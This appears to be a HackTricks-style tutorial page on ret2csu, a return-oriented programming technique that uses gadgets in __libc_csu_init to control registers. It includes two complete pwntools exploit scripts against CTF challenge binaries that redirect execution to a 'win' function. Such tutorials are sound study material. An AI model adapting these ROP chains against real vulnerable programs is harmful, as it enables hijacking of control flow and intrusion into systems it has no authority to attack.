  \ Information\n\n**ret2csu** is a hacking technique used when you're trying to take control of a program but can't find\
  \ the **gadgets** you usually use to manipulate the program's behavior.\n\nWhen a program uses certain libraries (like libc),\
  \ it has some built-in functions for managing how different pieces of the program talk to each other. Among these functions\
  \ are some hidden gems that can act as our missing gadgets, especially one called `__libc_csu_init`.\n\n### The Magic Gadgets\
  \ in \\_\\_libc_csu_init\n\nIn **`__libc_csu_init`**, there are two sequences of instructions (gadgets) to highlight:\n\n\
  1. The first sequence lets us set up values in several registers (rbx, rbp, r12, r13, r14, r15). These are like slots where\
  \ we can store numbers or addresses we want to use later.\n\n```armasm\npop rbx;\npop rbp;\npop r12;\npop r13;\npop r14;\n\
  pop r15;\nret;\n```\n\nThis gadget allows us to control these registers by popping values off the stack into them.\n\n2.\
  \ The second sequence uses the values we set up to do a couple of things:\n   - **Move specific values into other registers**,\
  \ making them ready for us to use as parameters in functions.\n   - **Perform a call to a location** determined by adding\
  \ together the values in r15 and rbx, then multiplying rbx by 8.\n\n```armasm\nmov rdx, r15;\nmov rsi, r14;\nmov edi, r13d;\n\
  call qword [r12 + rbx*8];\n```\n\n3. Maybe you don't know any address to write there and you **need a `ret` instruction**.\
  \ Note that the second gadget will also **end in a `ret`**, but you will need to meet some **conditions** in order to reach\
  \ it:\n\n```armasm\nmov rdx, r15;\nmov rsi, r14;\nmov edi, r13d;\ncall qword [r12 + rbx*8];\nadd rbx, 0x1;\ncmp rbp, rbx\n\
  jnz <func>\n...\nret\n```\n\nThe conditions will be:\n\n- `[r12 + rbx*8]` must be pointing to an address storing a callable\
  \ function (if no idea and no pie, you can just use `_init` func):\n  - If \\_init is at `0x400560`, use GEF to search for\
  \ a pointer in memory to it and make `[r12 + rbx*8]` be the address with the pointer to \\_init:\n\n```bash\n# Example from\
  \ https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html\ngef➤  search-pattern 0x400560\n[+] Searching\
  \ '\\x60\\x05\\x40' in memory\n[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x400000-0x401000),\
  \ permission=r-x\n  0x400e38 - 0x400e44  →   \"\\x60\\x05\\x40[...]\"\n[+] In '/Hackery/pod/modules/ret2_csu_dl/ropemporium_ret2csu/ret2csu'(0x600000-0x601000),\
  \ permission=r--\n  0x600e38 - 0x600e44  →   \"\\x60\\x05\\x40[...]\"\n```\n\n- `rbp` and `rbx` must have the same value\
  \ to avoid the jump\n- There are some omitted pops you need to take into account\n\n## RDI and RSI\n\nAnother way to control\
  \ **`rdi`** and **`rsi`** from the ret2csu gadget is by accessing it specific offsets:\n\n<figure><img src=\"../../images/image\

  >https://www.scs.stanford.edu/brop/bittau-brop.pdf</a></p></figcaption></figure>\n\nCheck this page for more info:\n\n\n\
  {{#ref}}\nbrop-blind-return-oriented-programming.md\n{{#endref}}\n\n## Example\n\n### Using the call\n\nImagine you want\
  \ to make a syscall or call a function like `write()` but need specific values in the `rdx` and `rsi` registers as parameters.\
  \ Normally, you'd look for gadgets that set these registers directly, but you can't find any.\n\nHere's where **ret2csu**\
  \ comes into play:\n\n1. **Set Up the Registers**: Use the first magic gadget to pop values off the stack and into rbx,\
  \ rbp, r12 (edi), r13 (rsi), r14 (rdx), and r15.\n2. **Use the Second Gadget**: With those registers set, you use the second\
  \ gadget. This lets you move your chosen values into `rdx` and `rsi` (from r14 and r13, respectively), readying parameters\
  \ for a function call. Moreover, by controlling `r15` and `rbx`, you can make the program call a function located at the\
  \ address you calculate and place into `[r15 + rbx*8]`.\n\nYou have an [**example using this technique and explaining it\
  \ here**](https://ir0nstone.gitbook.io/notes/types/stack/ret2csu/exploitation), and this is the final exploit it used:\n\
  \n```python\nfrom pwn import *\n\nelf = context.binary = ELF('./vuln')\np = process()\n\nPOP_CHAIN = 0x00401224 # pop r12,\
  \ r13, r14, r15, ret\nREG_CALL = 0x00401208  # rdx, rsi, edi, call [r15 + rbx*8]\nRW_LOC = 0x00404028\n\nrop.raw('A' * 40)\n\
  rop.gets(RW_LOC)\nrop.raw(POP_CHAIN)\nrop.raw(0)                      # r12\nrop.raw(0)                      # r13\nrop.raw(0xdeadbeefcafed00d)\
  \     # r14 - popped into RDX!\nrop.raw(RW_LOC)                 # r15 - holds location of called function!\nrop.raw(REG_CALL)\
  \               # all the movs, plus the call\n\np.sendlineafter('me\\n', rop.chain())\np.sendline(p64(elf.sym['win']))\
  \            # send to gets() so it's written\nprint(p.recvline())                        # should receive \"Awesome work!\"\
  \n```\n\n> [!WARNING]\n> Note that the previous exploit isn't meant to do a **`RCE`**, it's meant to just call a function\
  \ called **`win`** (taking the address of `win` from stdin calling gets in the ROP chain and storing it in r15) with a third\
  \ argument with the value `0xdeadbeefcafed00d`.\n\n### Bypassing the call and reaching ret\n\nThe following exploit was\
  \ extracted [**from this page**](https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html) where the\
  \ **ret2csu** is used but instead of using the call, it's **bypassing the comparisons and reaching the `ret`** after the\
  \ call:\n\n```python\n# Code from https://guyinatuxedo.github.io/18-ret2_csu_dl/ropemporium_ret2csu/index.html\n# This exploit\
  \ is based off of: https://www.rootnetsec.com/ropemporium-ret2csu/\n\nfrom pwn import *\n\n# Establish the target process\n\
  target = process('./ret2csu')\n#gdb.attach(target, gdbscript = 'b *    0x4007b0')\n\n# Our two __libc_csu_init rop gadgets\n\
  csuGadget0 = p64(0x40089a)\ncsuGadget1 = p64(0x400880)\n\n# Address of ret2win and _init pointer\nret2win = p64(0x4007b1)\n\
  initPtr = p64(0x600e38)\n\n# Padding from start of input to saved return address\npayload = \"0\"*0x28\n\n# Our first gadget,\
  \ and the values to be popped from the stack\n\n# Also a value of 0xf means it is a filler value\npayload += csuGadget0\n\
  payload += p64(0x0) # RBX\npayload += p64(0x1) # RBP\npayload += initPtr # R12, will be called in `CALL qword ptr [R12 +\
  \ RBX*0x8]`\npayload += p64(0xf) # R13\npayload += p64(0xf) # R14\npayload += p64(0xdeadcafebabebeef) # R15 > soon to be\
  \ RDX\n\n# Our second gadget, and the corresponding stack values\npayload += csuGadget1\npayload += p64(0xf) # qword value\
  \ for the ADD RSP, 0x8 adjustment\npayload += p64(0xf) # RBX\npayload += p64(0xf) # RBP\npayload += p64(0xf) # R12\npayload\
  \ += p64(0xf) # R13\npayload += p64(0xf) # R14\npayload += p64(0xf) # R15\n\n# Finally the address of ret2win\npayload +=\
  \ ret2win\n\n# Send the payload\ntarget.sendline(payload)\ntarget.interactive()\n```\n\n### Why Not Just Use libc Directly?\n\
  \nUsually these cases are also vulnerable to [**ret2plt**](../common-binary-protections-and-bypasses/aslr/ret2plt.md) +\
  \ [**ret2lib**](ret2lib/index.html), but sometimes you need to control more parameters than are easily controlled with the\
  \ gadgets you find directly in libc. For example, the `write()` function requires three parameters, and **finding gadgets\
  \ to set all these directly might not be possible**.\n\n{{#include ../../banners/hacktricks-training.md}}"
